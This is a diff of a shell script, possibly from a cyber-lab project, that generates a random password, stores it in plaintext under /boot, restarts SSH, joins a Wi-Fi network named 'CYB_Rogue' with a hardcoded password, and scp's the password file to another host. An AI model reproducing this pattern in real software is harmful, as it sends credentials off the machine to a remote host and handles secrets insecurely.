@@ -73,12 +73,21 @@ $
 ^
 &
 (
-)" > pass
+)
+-
+=
+_
++
+,
+.
+/
+<
+>
+?" > pass
 
 # Step 1: Shuffle the contents of the file and concatenate them into one continuous string
 # head -c 12 uses the first 12 characters to make its password, you can adjust this to make it longer or shorter
-num=$(shuf -i 6-20 -n 1)
-new_password=$(shuf pass | tr -d '\n' | shuf | head -c $num)
+new_password=$(shuf pass | tr -d '\n' | shuf | head -c 12)
 
 # Step 2: Output the new password
 echo "New password: $new_password"
@@ -98,6 +107,7 @@ sudo echo "New password: $new_password" > /boot/passwords.txt
 # make the file yours
 sudo chown $USER /boot/passwords.txt
 
+sudo service ssh restart
 sudo nmcli dev wifi list
 sudo nmcli dev wifi connect CYB_Rogue password D0ntT3llem1
-scp /boot/passwords.txt pi@192.168.0.5: /home/pi/Desktop/passwords.txt
+scp /boot/passwords.txt pi@192.168.0.5:/boot/passwords.txt
